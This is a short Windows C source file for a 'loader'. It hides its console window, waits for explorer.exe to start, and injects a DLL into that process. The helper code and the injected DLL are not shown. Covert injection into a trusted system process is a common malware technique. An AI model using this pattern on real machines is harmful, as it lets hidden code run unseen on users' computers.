#include "common.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	Log("[LOADER] Started");

	DWORD pid = 0;
	for (int i = 0; i < 30; i++)
	{
		pid = GetPidByName(L"explorer.exe");
		if (pid)
			break;
		Sleep(1000);
	}

	if (!pid)
	{
		Log("[LOADER] explorer.exe not found");
		return 1;
	}

	if (InjectDll(pid, GetDllPath()))
	{
		Log("[LOADER] Injection successful!");
	}
	else
	{
		Log("[LOADER] Injection failed");
	}

	Log("[LOADER] Exiting");
	return 0;
}